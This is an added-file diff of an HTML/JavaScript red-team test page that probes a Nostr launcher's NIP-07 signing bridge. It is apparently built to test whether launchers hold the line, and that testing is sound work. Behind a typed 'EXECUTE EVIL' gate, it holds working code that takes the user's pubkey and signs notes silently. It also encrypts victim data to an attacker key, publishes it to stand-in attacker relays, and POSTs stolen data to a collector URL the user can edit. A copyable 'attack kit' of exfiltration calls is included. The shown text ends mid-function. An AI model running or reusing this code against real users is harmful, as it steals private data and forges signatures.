@@ -1,0 +1,807 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-06 signer abuse</title>
+<meta name="description" content="Red team: the NIP-07 bridge hands the napp the user's signing and cipher authority behind a permission prompt — pubkey handout, prompt-policy silent signing, nip04/nip44 encryption to the attacker's key as a private-data egress channel, relay-REQ exfiltration. Demo by default; VERY EVIL mode behind a typed gate.">
+<meta name="napp-id" content="evil-06-signer-abuse">
+<!--
+  evil-napps ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key on the napp's OWN origin proves
+    the origin grant, nothing more), no network, no signing, no dispatch,
+    no store mutation, no persistence, no destruction.
+  - ONE navigation exception: the ancestor-navigation probe can only detect
+    permission by navigating, so it reloads the launcher at its OWN current
+    URL with a marker hash — reversible, nothing leaves the launcher's URL.
+  - VERY EVIL mode: in-napp arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution,
+    destructive payloads last.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+  #hijack {
+    display: none;
+    background: var(--danger);
+    color: #14060a;
+    font-weight: 700;
+    text-align: center;
+    padding: var(--space-2);
+    flex: 0 0 auto;
+  }
+  #hijack a { color: inherit; }
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="hijack">⚠ THIS PAGE JUST NAVIGATED THE LAUNCHER (window.top) AWAY — you are looking at the evil napp, not the launcher. <a href="about:blank" onclick="history.length > 1 ? history.back() : null; return false">go back</a> if you can.</div>
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened launcher will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-06-signer-abuse';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  // If this page ever IS the top-level browsing context, the launcher was
+  // hijacked to it — show the banner (see the hijack row in evil-01).
+  if (window.top === window) document.getElementById('hijack').style.display = 'block';
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function randHex(n) {
+    const b = new Uint8Array(n / 2);
+    crypto.getRandomValues(b);
+    return Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  // NAPP context: instance id (window.name), the granted bridge surface,
+  // origin/position — captured once for every probe and the report.
+  function bridgePresence() {
+    return {
+      instance: safeGet(() => window.name) || null,
+      nostr: !!findNostr(),
+      nostrdb: typeof window.nostrdb === 'object',
+      napp: typeof window.napp === 'object',
+    };
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      parentLength: safeGet(() => window.parent.length),
+      bridge: bridgePresence(),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — launcher/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function postTop(msg) { window.top.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { cleanup(); resolve('timeout'); }, ms);
+    });
+  }
+  // A bridge rpc with the napp dialect this suite speaks (mirrors the
+  // reference bridge.js): a postMessage envelope tagged __nostrapps:"rpc".
+  // The wait outlasts a permission dialog's stale-dismiss (4s) so a denied
+  // reply is never mistaken for silence.
+  function bridgeRpc(method, params) {
+    const id = 'evil-rpc-' + randId();
+    const p = waitForMsg(id, 6500);
+    postParent({
+      __nostrapps: 'rpc', id: id, method: method,
+      params: params, instanceId: window.name,
+    });
+    return p;
+  }
+  // sessionStorage flag that survives a launcher reload at this origin —
+  // used by probes that must navigate to detect (see top-nav row).
+  const NAV_FLAG = '__evil01_navprobe__';
+  function navProbeFlag() { try { return sessionStorage.getItem(NAV_FLAG); } catch (_) { return null; } }
+  function setNavProbeFlag() { try { sessionStorage.setItem(NAV_FLAG, new Date().toISOString()); } catch (_) {} }
+  function clearNavProbeFlag() { try { sessionStorage.removeItem(NAV_FLAG); } catch (_) {} }
+
+  // evil-06 — signer & cipher authority abuse (tier 2). NAPP.md: window.nostr is
+// the NIP-07 bridge — getPublicKey, signEvent, nip04/nip44 — handed to every
+// napp whose grant includes `identity`, with "sensitive operations such as
+// signing … prompt[ing] separately". The prompt IS the security boundary, and
+// prompt quality is launcher policy: an auto-allow policy (or one tired
+// "always") makes every later call silent. And the cipher methods are a
+// built-in exfiltration channel: nip04.encrypt(ATTACKER_KEY, yourData)
+// produces a ciphertext only the attacker can read — publish it anywhere.
+// utils.subscribe is ungated in the reference (reads don't prompt), and the
+// REQ's filter fields travel to whatever relays the napp names — the filter
+// itself can carry the data.
+window.__EVIL_KIT__ = [
+  {
+    label: 'cipher exfil call',
+    note: 'nip44.encrypt to the ATTACKER\'s pubkey turns the user\'s own bridge into a private-data drop: the ciphertext is readable by exactly one party, and utils.publish (or any relay) is the drop point.',
+    data: { call: 'window.nostr.nip44.encrypt(ATTACKER_PUBKEY, <private data>)', then: 'window.napp.utils.publish(signedEvent, ["wss://attacker.example"])' },
+  },
+  {
+    label: 'filter-as-payload relay exfil',
+    note: 'utils.subscribe(relays, filter) is ungated in the reference — reads never prompt. The filter travels to the named relays verbatim: NIP-50 search terms (or any array field) can carry the data out.',
+    data: { call: 'window.napp.utils.subscribe(["wss://attacker.example"], { kinds: [1], search: "<private data>" })' },
+  },
+  {
+    label: 'the auto-allow residue',
+    note: 'The reference remembers "allow always" per napp+method in its own localStorage (nostrapps:permissions). One click of Allow always — or a launcher with an auto-allow policy — and every later signEvent is silent forever.',
+    data: { store: { 'evil-06-signer-abuse|signEvent': 'allow' } },
+  },
+];
+
+const ATTACKER_PK = 'aaaa0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f5777';
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+async function rpcOk(method, params) {
+  const r = await bridgeRpc(method, params);
+  if (r === 'timeout') return { error: 'rpc timeout' };
+  if (r && typeof r === 'object' && r.error !== undefined) return { error: r.error };
+  return { result: r && r.result !== undefined ? r.result : r };
+}
+async function victimNote() {
+  const r = await rpcOk('nostrdb.query', { filters: { kinds: [1] } });
+  const evs = Array.isArray(r.result) ? r.result : [];
+  return evs.find(e => (e.content || '').indexOf('victim note') !== -1) || null;
+}
+
+const ATTACKS = [
+  {
+    id: 'pk-handout',
+    name: 'pubkey handout',
+    target: 'window.nostr.getPublicKey — granted with `identity`, no prompt',
+    severity: 'high',
+    harm: 'The bridge hands the user\'s pubkey to every identity-granted napp — the basis for all the quieter things below: targeted cipher exfil, user-correlation across apps, personalized bait.',
+    evilBrief: 'Calls getPublicKey and POSTs the pubkey to the collector.',
+    async demo() {
+      const r = await rpcOk('getPublicKey');
+      if (typeof r.result === 'string' && r.result.length >= 32) {
+        return armed('your pubkey is in my frame: ' + mask(r.result, 10) + ' — the identity grant hands it to any napp, no prompt');
+      }
+      return blocked('getPublicKey refused: ' + (r.error || 'no key') + ' — the identity grant did not cover me');
+    },
+    async evil() {
+      const r = await rpcOk('getPublicKey');
+      const out = { pubkey: r.result || r.error };
+      out.exfil = await sendToCollector('pk-handout', { pubkey: r.result });
+      return out;
+    },
+  },
+  {
+    id: 'silent-sign',
+    name: 'prompt-policy silent signing',
+    target: 'signEvent\'s only boundary is the launcher\'s prompt policy',
+    severity: 'critical',
+    harm: 'Under an auto-allow policy (or one remembered "always") signEvent is silent: notes, reactions, zap requests — anything — signed as the user with no dialog. The demo probes the policy with a CIPHER call (no signature is ever produced in demo mode); execute signs a marker for real.',
+    evilBrief: 'Calls window.nostr.signEvent on a loud marker note and exfiltrates the resulting signature. If a prompt policy stands in the way, the payload reports the denial — that policy is the only thing that held.',
+    async demo() {
+      // probe the gated-call channel WITHOUT signing: nip44.encrypt to my own
+      // key with a marker (gated exactly like signEvent in the reference)
+      const t0 = Date.now();
+      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: '__evil06_policy_probe__' });
+      const ms = Math.round(Date.now() - t0);
+      if (typeof r.result === 'string' && r.result.indexOf('FAKE-nip44.encrypt') !== -1) {
+        return armed('the gated-call channel AUTO-APPROVED my cipher call in ' + ms + 'ms — signEvent sits behind the same policy and will be equally silent');
+      }
+      if (r.error && /denied|Permission/i.test(r.error)) {
+        if (ms > 2500) {
+          return blocked('denied after ' + ms + 'ms — a dialog stood in the way (the launcher asked). Auto-allow policies and one "always" click remove even that; execute in VERY EVIL mode to test the policy for real');
+        }
+        return blocked('denied in ' + ms + 'ms with no dialog — the launcher refuses gated calls outright (deny-all policy)');
+      }
+      return na('probe inconclusive: ' + (r.error || String(r.result).slice(0, 40)));
+    },
+    async evil() {
+      const t0 = Date.now();
+      const r = await rpcOk('signEvent', {
+        kind: 1,
+        tags: [['alt', 'evil-06 silent signing proof'], ['client', 'evil-napps']],
+        content: 'evil-06: your key signed this note. If you did not see a dialog, the signing policy is silent.',
+        created_at: Math.floor(Date.now() / 1000),
+      });
+      const ms = Math.round(Date.now() - t0);
+      if (r.result && r.result.sig) {
+        const out = { signed: true, latencyMs: ms, sig: mask(r.result.sig, 12), id: r.result.id };
+        out.exfil = await sendToCollector('silent-sign', { event: r.result, latencyMs: ms });
+        return out;
+      }
+      return { signed: false, latencyMs: ms, error: r.error || 'no signature' };
+    },
+  },
+  {
+    id: 'nip-exfil',
+    name: 'cipher exfiltration channel',
+    target: 'nip04/nip44 encrypt to ANY pubkey — the attacker\'s included',
+    severity: 'critical',
+    harm: 'The user\'s own cipher authority is a private-data drop: nip44.encrypt(ATTACKER_KEY, data) yields a ciphertext readable by exactly one party, and publish (gated, but often auto) is the mailman. Private data leaves as a legitimately-encrypted message to the attacker.',
+    evilBrief: 'Reads the victim\'s note out of the shared store, encrypts its content to MY key with nip44, publishes the ciphertext to attacker relays, and POSTs it to the collector — a complete private-data exfil chain.',
+    async demo() {
+      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: '__evil06_channel_probe__' });
+      if (typeof r.result === 'string' && r.result.indexOf('to:' + ATTACKER_PK.slice(0, 8)) !== -1) {
+        return armed('the bridge encrypted a marker TO MY KEY: ' + mask(r.result, 26) + ' — I am the only party who can read it back. The user\'s own cipher is my private drop; publish is the mailman.');
+      }
+      if (r.error && /denied|Permission/i.test(r.error)) {
+        return blocked('the cipher call was refused (' + r.error + ') — the prompt policy held this channel');
+      }
+      return na('probe inconclusive: ' + (r.error || String(r.result).slice(0, 40)));
+    },
+    async evil() {
+      const note = await victimNote();
+      const data = note ? note.content : '(no victim note found — using marker)';
+      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: data });
+      const out = { victimData: note ? mask(data, 16) : data };
+      if (typeof r.result === 'string') {
+        out.ciphertextTo = ATTACKER_PK;
+        // the drop point: publish the ciphertext toward attacker relays
+        const ev = {
+          id: randHex(64),
+          pubkey: ATTACKER_PK,
+          created_at: Math.floor(Date.now() / 1000),
+          kind: 1,
+          tags: [],
+          content: 'dm:' + r.result,
+          sig: randHex(128),
+        };
+        const pub = await rpcOk('napp.publish', { event: ev, relays: ['wss://attacker-relay.example', 'wss://attacker-clone.example'] });
+        out.published = !pub.error;
+        out.exfil = await sendToCollector('nip-exfil', { ciphertext: r.result, victimData: note ? data : null });
+      } else {
+        out.error = r.error || 'no ciphertext';
+      }
+      return out;
+    },
+  },
+  {
+    id: 'relay-exfil',
+    name: 'relay-REQ exfiltration',
+    target: 'utils.subscribe(relays, filter) — ungated, and the filter travels verbatim',
+    severity: 'critical',
+    harm: 'Reads never prompt, and the REQ goes to whatever relays the napp names with whatever filter it writes: NIP-50 search terms (or any array field) can carry private data to the attacker\'s relay. The request itself is the exfiltration.',
+    evilBrief: 'Subscribes to the attacker\'s relay with the VICTIM\'s note content embedded in the filter (NIP-50 search), closes, and POSTs the same filter to the collector.',
+    async demo() {
+      const got = await new Promise((resolve) => {
+        let done = false;
+        const finish = (v) => { if (!done) { done = true; resolve(v); } };
+        const closer = window.napp && window.napp.utils && window.napp.utils.subscribe
+          ? window.napp.utils.subscribe(['wss://attacker.example.invalid'], { kinds: [1], search: '__evil06_req_probe__' }, {
+              eoseEventsCallback: () => finish('eose'),
+            })
+          : null;
+        if (!closer) return finish('no-bridge');
+        setTimeout(() => finish('no-eose'), 2500);
+        // ROE: no lingering channels — close after the probe settles
+        setTimeout(() => { try { closer(); } catch (_) {} }, 2600);
+      });
+      if (got === 'eose') {
+        return armed('the launcher accepted my REQ to the ATTACKER\'s relay with my marker in the filter — in a real launcher that filter just left the machine verbatim (reads never prompt)');
+      }
+      if (got === 'no-eose') {
+        return armed('the launcher accepted my REQ to the ATTACKER\'s relay (no eose observed, but the REQ channel is open — reads never prompt)');
+      }
+      return na('no bridge utils available (at-launcher mode has none)');
+    },
+    async evil() {
+      const note = await victimNote();
+      const data = note ? note.content : '__evil06_req_marker__';
+      const out = { carried: mask(data, 16) };
+      const closer = window.napp.utils.subscribe(['wss://attacker-relay.example'], { kinds: [1], search: data }, {
+        eoseEventsCallback: () => {},
+      });
+      await sleep(600);
+      try { closer && closer(); } catch (_) {}
+      out.exfil = await sendToCollector('relay-exfil', { filter: { kinds: [1], search: data } });
+      return out;
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — launcher held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — launcher holds' };
